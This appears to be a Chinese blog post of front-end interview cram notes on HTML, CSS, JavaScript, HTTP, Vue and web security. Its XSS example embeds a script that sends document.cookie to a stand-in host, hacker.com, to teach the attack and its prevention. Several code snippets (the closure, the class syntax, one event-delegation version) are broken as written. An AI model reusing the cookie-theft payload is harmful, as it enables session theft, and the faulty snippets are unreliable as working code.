---
title: 前端重要知识点汇总
categories: 前端
tag:
  - http
  - js
  - css
abbrlink: 791fb1d4
date: 2018-07-09 00:00:00
---

1.  [《互联网公司招聘启事的正确阅读方式》](https://zhuanlan.zhihu.com/p/33998813)
2.  [前端面试记](https://juejin.im/post/587dab348d6d810058d87a0a)
    观看。

## js 题目

大部分答案可以在谷歌上搜到。

套路

1.  举例
2.  将不会的变成会的
3.  侃侃而谈

## HTML 押题

1.  （必考） 你是如何理解 HTML 语义化的？第一种举例，段落用 p，边栏用 aside，主要内容用 main 标签第二种最开始是 PHP 后端写 HTML，不会 CSS，于是就用 table 来布局。table 使用展示表格的。严重违反了 HTML 语义化。后来有了专门的写 CSS 的前端，他们会使用 DIV + CSS 布局，主要是用 float 和绝对定位布局。稍微符合了 HTML 语义化。再后来，前端专业化，知道 HTML 的各个标签的用法，于是会使用恰当的标签来展示内容，而不是傻傻的全用 div，会尽量使用 h1、ul、p、main、header 等标签语义化的好处是已读、有利于 SEO 等。第三种：对面试官说请看文章 https://zhuanlan.zhihu.com/p/32570423
2.  meta viewport 是做什么用的，怎么写？死背：
    ```html
    <meta name=\\\"viewport\\\" content=\\\"width=device-width,
    user-scalable=no, initial-scale=1.0, maximum-scale=1.0,
    minimum-scale=1.0\\\">
    ```
    控制页面在移动端不要缩小显示。侃侃而谈一开始，所有页面都是给 PC 准备的，乔布斯推出 iPhone 3GS，页面是不适应手机屏幕的，所以乔布斯的工程师想了一个办法，默认把手机模拟成 980px，页面缩小。后来，智能手机普及，这个功能在部分网站不需要了，所以我们就用 meta:vp 让手机不要缩小我的网页。
3.  canvas 元素是干什么的？项目丢给他。看 MDN 的 canvas [入门手册](https://developer.mozilla.org/zh-CN/docs/Web/API/Canvas_API)。

CSS 押题

1.  （必考） 说说盒模型。
    - 举例：
      content-box: width == 内容区宽度
      border-box: width == 内容区宽度 + padding 宽度 + border 宽度
2.  css reset 和 normalize.css 有什么区别？
    - 考英文：
      - reset 重置，之前的样式我不要，a{color: red;}，抛弃默认样式
      - normalize 让所有浏览器的标签都跟标准规定的默认样式一致，各浏览器上的标签默认样式基本统一。
3.  （必考）如何居中？
    - 平时总结：
      - 水平居中：
        - 内联：爸爸身上写 text-align:center;
        - 块级：margin-left: auto; margin-right: auto;
      - 垂直居中： https://jscode.me/t/topic/1936
4.  选择器优先级如何确定？
    1.  选择器越具体，优先级越高。 #xxx 大于 .yyy
    2.  同样优先级，写在后面的覆盖前面的。
    3.  color: red !important; 优先级最高。
5.  BFC 是什么？
    - 举例：
      - overflow:hidden 清除浮动。（方方总是用 .clearfix 清除浮动，坚决不用 overflow:hidden 清除浮动）
      - overflow:hidden 取消父子 margin 合并。http://jsbin.com/conulod/1/edit?html,css,js,output （方方用 padding-top: 1px;）
6.  如何清除浮动？
    1.  overflow: hidden （方方反对）
    2.  .clearfix 清除浮动写在爸爸身上
        ```css
        .clearfix::after {
          content: \"\";
          display: block;
          clear: both;
        }
        .clearfix {
          zoom: 1; /* IE 兼容 */
        }
        ```

JS 押题

1.  JS 有哪些数据类型？
    string number bool undefined null object symbol
    object 包括了数组、函数、正则、日期等对象一旦出现（数组、函数、正则、日期、NaN）直接 0 分
2.  （必考） Promise 怎么使用？
    - then
      ```js
      $.ajax(...).then(成功函数, 失败函数)
      ```
    - 链式 then
      ```js
      $.ajax(...).then(成功函数, 失败函数).then(成功函数2, 失败函数2)
      ```
    - 如何自己生成 Promise 对象
      ```js
      function xxx(){
              return new Promise(function(resolve, reject){
                  setTimeout(()=>{
                      resolve() 或者 reject()
              },3000)
          })
      }
      xxx().then(...)
      ```
3.  （必考） AJAX 手写一下？
    ```js
    let xhr = new XMLHttpRequest();
    xhr.open(\"POST\", \"/xxxx\");
    xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                console.log(xhr.responseText);
        }
    };
    xhr.send(\"a=1&b=2\");
    ```
4.  （必考）闭包是什么？

    ```js
    function (){
            var n = 0
        return function(){
                n += 1
        }
    }

    let  adder = ()
    adder() // n === 1
    adder() // n === 2
    console.log(n) // n is not defined
    ```

    正确参考：https://zhuanlan.zhihu.com/p/22486908

5.  （必考）这段代码里的 this 是什么？

    ```js
    var obj = {
      foo: function() {
        console.log(this);
      }
    };
    var bar = obj.foo;
    obj.foo(); // 打印出的 this 是 obj
    bar(); // 打印出的 this 是 window
    ```

    1.  fn() 里面的 this 就是 window
    2.  fn() 是 strict mode，this 就是 undefined
    3.  a.b.c.fn() 里面的 this 就是 a.b.c
    4.  new F() 里面的 this 就是新生成的实例
    5.  () => console.log(this) 里面 this 跟外面的 this 的值一模一样正确参考：https://zhuanlan.zhihu.com/p/23804247

6.  （必考）什么是立即执行函数？使用立即执行函数的目的是什么？

    ```js
    (function() {
      var name;
    })();
    (function() {
      var name;
    })();
    !!!!!!!(function() {
      var name;
    })();
    ~(function() {
      var name;
    })();
    ```

    造出一个函数作用域，防止污染全局变量

    ES 6 新语法

    ```js
    {
      let name;
    }
    ```

7.  async/await 语法了解吗？目的是什么？

    ```js
    function returnPromise() {
      return new Promise(function(resolve, reject) {
        setTimeout(() => {
          resolve("fuck");
        }, 3000);
      });
    }

    returnPromise().then(result => {
      result === "fuck";
    });

    var result = await returnPromise();
    result === "fuck";
    ```

    把异步代码写成同步代码。

8.  如何实现深拷贝？

    1.  JSON 来深拷贝
        ```js
        var a = {...}
        var b = JSON.parse( JSON.stringify(a) )
        ```
        缺点：JSON 不支持函数、引用、undefined、RegExp、Date……
    2.  递归拷贝

        ```js
        function clone(object){
                var object2
            if(! (object instanceof Object) ){
                    return object
            }else if(object instanceof Array){
                    object2 = []
            }else if(object instanceof Function){
                    object2 = eval(object.toString())
            }else if(object instanceof Object){
                    object2 = {}
            }

            你也可以把 Array Function Object 都当做 Object 来看待，参考 https://juejin.im/post/587dab348d6d810058d87a0a

            for(let key in object){
                    object2[key] = clone(object[key])
            }
            return object2
        }
        ```

    3.  环
    4.  RegExp、Date、Set、Symbol、WeakMap

9.  如何实现数组去重？
    1.  计数排序的逻辑
        ```js
        var a = [4, 2, 5, 6, 3, 4, 5];
        var hashTab = {};
        for (let i = 0; i < a.length; i++) {
          if (a[i] in hashTab) {
            // 什么也不做
          } else {
            hashTab[a[i]] = true;
          }
        }
        //hashTab: {4: true, 2: true, 5: true, 6:true, 3: true}
        console.log(Object.keys(hashTab)); // ['4','2','5','6','3']
        ```
    2.  Set 去重
        `js Array.from(new Set(a));`
        或者
    ```js
    function deArr(arr) {
      return [...new Set(arr)];
    }
    var a = [1, 2, 35, 5, 47, 8, 57, 4, 54, 54, 5, 5, 4];
    console.log(deArr(a));
    //[1, 2, 35, 5, 47, 8, 57, 4, 54]
    ```
    3.  WeakMap 任意类型去重
10. 如何用正则实现 string.trim() ？
    ```js
    function trim(string) {
            return string.replace(/^\\\\s+|\\\\s+$/g, \"\");
    }
    ```
11. JS 原型是什么？
    - 举例
      1.  var a = [1,2,3]
      2.  只有 0、1、2、length 4 个 key
      3.  为什么可以 a.push(4) ，push 是哪来的？
      4.  a.**proto** === Array.prototype
      5.  push 就是沿着 a.**proto** 找到的，也就是 Array.prototype.push
      6.  Array.prototype 还有很多方法，如 join、pop、slice、splice
      7.  Array.prototype 就是 a 的原型（**proto**）参考：https://zhuanlan.zhihu.com/p/23090041
12. ES 6 中的 class 了解吗？
    - 把 MDN class 章节看完
    - 记住一个例子
13. JS 如何实现继承？

    - 原型链

      ```js
      function Animal() {
              this.body = \"肉体\";
      }
      Animal.prototype.move = function() {};

      function Human(name) {
              Animal.apply(this, arguments);
          this.name = name;
      }
      // Human.prototype.__proto__ = Animal.prototype // 非法

      var f = function() {};
      f.prototype = Animal.prototype;
      Human.prototype = new f();

      Human.prototype.useTools = function() {};

      var frank = new Human();
      ```

    - extends 关键字
      ```js
      class Animal{
              constructor(){
                  this.body = '肉体'
          },
          move(){}
      }
      class Human extends Animal{
              constructor(name){
                  super()
              this.name = name
          },
          useTools(){}
      }
      var frank = new Human()
      ```

14. == 相关题目直接反着答（放弃）

## DOM 押题

1.  DOM 事件模型是什么？
    1.  冒泡
    2.  捕获
    3.  [如果这个元素是被点击的元素，那么捕获不一定在冒泡之前，顺序是由监听顺序决定的](http://jsbin.com/raqakog/1/edit?js,console,output)。
2.  移动端的触摸事件了解吗？
    1.  touchstart touchmove touchend touchcancel
    2.  模拟 swipe 事件：记录两次 touchmove 的位置差，如果后一次在前一次的右边，说明向右滑了。
3.  事件委托是什么？有什么好处？

    1.  假设父元素有 4 个儿子，我不监听 4 个儿子，而是监听父元素，看触发事件的元素是哪个儿子，这就是事件委托。
    2.  可以监听还没有出生的儿子（动态生成的元素）。省监听器。

    ```js
    function listen(element, eventType, selector, fn) {
      element.addEventListener(eventType, e => {
        if (e.target.matches(selector)) {
          fn.call(el, e, el);
        }
      });
    } // 有 bug 但是可以应付面试官的事件委托
    ```

    ```js
    function listen(element, eventType, selector, fn) {
            element.addEventListener(eventType, e => {
                let el = e.target;
            while (!el.matches(selector)) {
                    if (element === el) {
                        el = null;
                    break;
                }
                el = el.parentNode;
            }
            el && fn.call(el, e, el);
        });
        return element;
    } // 工资 12k+ 的前端写的事件委托
    listen(ul, \"click\", \"li\", () => {});

    ul > li * 5 > span;
    ```

## HTTP 押题

1.  HTTP 状态码知道哪些？
2.  301 和 302 的区别是什么？
    1.  301 永久重定向，浏览器会记住
    2.  302 临时重定向
3.  HTTP 缓存怎么做？
    1.  Cache-Control: max-age=300
    2.  http://cdn.com/1.js?v=1 避开缓存
4.  Cache-Control 和 Etag 的区别是什么？
5.  Cookie 是什么？Session 是什么？
    - Cookie
      1.  HTTP 响应通过 Set-Cookie 设置 Cookie
      2.  浏览器访问指定域名是必须带上 Cookie 作为 Request Header
      3.  Cookie 一般用来记录用户信息
    - Session
      1.  Session 是服务器端的内存（数据）
      2.  Session 一般通过在 Cookie 里记录 SessionID 实现
      3.  SessionID 一般是随机数
6.  LocalStorage 和 Cookie 的区别是什么？
    1.  Cookie 会随请求被发到服务器上，而 LocalStorage 不会
    2.  Cookie 大小一般 4k 以下，LocalStorage 一般 5Mb 左右
7.  （必考）GET 和 POST 的区别是什么？
    1.  参数。GET 的参数放在 url 的查询参数里，POST 的参数（数据）放在请求消息体里。
    2.  安全（扯淡）。GET 没有 POST 安全（都不安全）
    3.  GET 的参数（url 查询参数）有长度限制，一般是 1024 个字符。POST 的参数（数据）没有长度限制（扯淡，4~10Mb 限制）
    4.  包。GET 请求只需要发一个包，POST 请求需要发两个以上包（因为 POST 有消息体）（扯淡，GET 也可以用消息体）
    5.  GET 用来读数据，POST 用来写数据，POST 不幂等（幂等的意思就是不管发多少次请求，结果都一样。）
8.  （必考）怎么跨域？JSONP 是什么？CORS 是什么？postMessage 是什么？
    1.  JSONP
    2.  CORS
    3.  postMessage 看一下 MDN

Vue 押题

1.  （必考）Vue 有哪些生命周期钩子函数？

    - 看文档

2.  （必考）Vue 如何实现组件通信？
    1.  父子通信（使用 Prop 传递数据、使用 v-on 绑定自定义事件）
    2.  爷孙通信（通过两对父子通信，爷爸之间父子通信，爸儿之间父子通信）
    3.  [兄弟通信（new Vue() 作为 eventBus）](https://cn.vuejs.org/v2/guide/components.html#%E9%9D%9E%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E7%9A%84%E9%80%9A%E4%BF%A1)
3.  Vuex 的作用是什么？
    - 看文档、博客 https://vuex.vuejs.org/zh-cn/intro.html
4.  VueRouter 路由是什么？
    - 看文档、博客
5.  Vue 的双向绑定是如何实现的？有什么缺点？
    - 看文档，[深入响应式原理](https://cn.vuejs.org/v2/guide/reactivity.html)
6.  Computed 计算属性的用法？跟 Methods 的区别。
    https://zhuanlan.zhihu.com/p/33778594

算法押题

1.  排序算法（背诵冒泡排序、选择排序、计数排序、快速排序、插入排序、归并排序）
2.  二分查找法
3.  翻转二叉树

把上面三个背一下，算法题必过。

安全押题

1.  什么是 XSS 攻击？如何预防？
    - 举例
      ```
      div.innerHTML = userComment  // userComment 内容是 <script>$.get('http://hacker.com?cookie='+document.cookie)</script>
      // 恶意就被执行了，这就是 XSS
      ```
    - 预防
      1.  不要使用 innerHTML，改成 innerText，script 就会被当成文本，不执行
      2.  如果你一样要用 innerHTML，字符过滤
          - 把 < 替换成 `&lt;`
          - 把 > 替换成 `&gt;`
          - 把 & 替换成 `&amp;`
          - 把 ' 替换成 `&#39;`
          - 把 ' 替换成 `&quot;`
          - 代码 div.innerHTML = userComment.replace(/>/g, '`&lt;`').replace...
      3.  使用 CSP Content Security Policy
2.  什么是 CSRF 攻击？如何预防？
    - 过程
      1.  用户在 qq.com 登录
      2.  用户切换到 hacker.com（恶意网站）
      3.  hacker.com 发送一个 qq.com/add_friend 请求，让当前用户添加 hacker 为好友。
      4.  用户在不知不觉中添加 hacker 为好友。
      5.  用户没有想发这个请求，但是 hacker 伪造了用户发请求的假象。
    - 避免
      1.  检查 referer，qq.com 可以拒绝来自 hacker.com 的请求
      2.  csrf_token 来解决

## Webpack 题

1.  转译出的文件过大怎么办？
    - 使用 code split
    - 写法 import('xxx').then(xxx=>{console.log(xxx)})
    - xxx 模块就是按需加载的
2.  写过 webpack loader 吗？
    - [webpack loader](http://www.alloyteam.com/2016/01/webpack-loader-1/)

## 发散题

1.  从输入 URL 到页面展现中间发生了什么？ 1. DNS 查询 DNS 缓存 2. 建立 TCP 连接（三次握手）连接复用 3. 发送 HTTP 请求（请求的四部分） 4. 后台处理请求 1. 监听 80 端口 2. 路由 3. 渲染 HTML 模板 4. 生成响应 5. 发送 HTTP 响应 6. 关闭 TCP 连接（四次挥手） 7. 解析 HTML 8. 下载 CSS（缓存 9. 解析 CSS 10. 下载 JS（缓存 11. 解析 JS 12. 下载图片 13. 解析图片 14. 渲染 DOM 树 15. 渲染样式树 16. 执行 JS
    刁钻代码

1.  map 加 parseInt

    ```js
    [1, 2, 3].map(parseInt);

    parseInt(1, 0, array); // 1
    parseInt(2, 1, array); // NaN
    parseInt(3, 2, array); // NaN
    ```

1.  a.x = a = {}
    ```js
    var a = { n: 1 };
    var b = a;
    a.x = a = { n: 2 };
    ```
    问 a.x 是多少？
1.  (a ==1 && a== 2 && a==3) 可能为 true 吗？
    ```js
    a = {
      value: 0,
      toString() {
        a.value += 1;
        return a.value;
      }
    };
    ```
